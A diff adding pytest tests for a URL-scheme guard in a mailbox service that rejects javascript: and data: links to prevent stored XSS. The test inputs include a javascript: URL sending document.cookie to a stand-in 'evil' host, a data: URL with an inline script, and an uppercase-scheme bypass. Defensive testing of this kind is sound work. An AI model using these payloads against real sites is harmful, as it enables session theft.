@@ -562,3 +562,62 @@ async def test_send_reply_to_newline_raises_400():
         )
 
     assert exc.value.status_code == 400
+
+
+# ---------------------------------------------------------------------------
+# URL protocol validation — BZ-008 BLOQUEANTE (XSS stored via link)
+# enlaces[].url must start with http:// or https://; any other scheme is
+# rejected at write-time so the unsafe URL is never stored or served.
+# ---------------------------------------------------------------------------
+
+
+def test_reject_bad_url_javascript_raises_400():
+    """javascript: URL must be rejected — clicking it executes arbitrary code."""
+    from services.buzon.guards import reject_bad_url
+
+    with pytest.raises(HTTPException) as exc:
+        reject_bad_url(
+            "enlaces[0].url", "javascript:fetch('https://evil/'+document.cookie)"
+        )
+    assert exc.value.status_code == 400
+
+
+def test_reject_bad_url_data_raises_400():
+    """data: URL is a XSS vector (inline HTML/JS) and must be rejected."""
+    from services.buzon.guards import reject_bad_url
+
+    with pytest.raises(HTTPException) as exc:
+        reject_bad_url("enlaces[0].url", "data:text/html,<script>alert(1)</script>")
+    assert exc.value.status_code == 400
+
+
+def test_reject_bad_url_javascript_uppercase_raises_400():
+    """Protocol check must be case-insensitive (JAVASCRIPT: bypasses naive checks)."""
+    from services.buzon.guards import reject_bad_url
+
+    with pytest.raises(HTTPException) as exc:
+        reject_bad_url("enlaces[0].url", "JAVASCRIPT:alert(1)")
+    assert exc.value.status_code == 400
+
+
+def test_reject_bad_url_http_passes():
+    """http:// URLs are allowed — must not raise."""
+    from services.buzon.guards import reject_bad_url
+
+    reject_bad_url("enlaces[0].url", "http://example.com/path")
+
+
+def test_reject_bad_url_https_passes():
+    """https:// URLs are allowed — must not raise."""
+    from services.buzon.guards import reject_bad_url
+
+    reject_bad_url("enlaces[0].url", "https://example.com/path?q=1")
+
+
+def test_reject_bad_url_error_includes_field_name():
+    """The 400 detail message must include the field name for debuggability."""
+    from services.buzon.guards import reject_bad_url
+
+    with pytest.raises(HTTPException) as exc:
+        reject_bad_url("enlaces[2].url", "javascript:evil()")
+    assert "enlaces[2].url" in exc.value.detail.get("message", "")
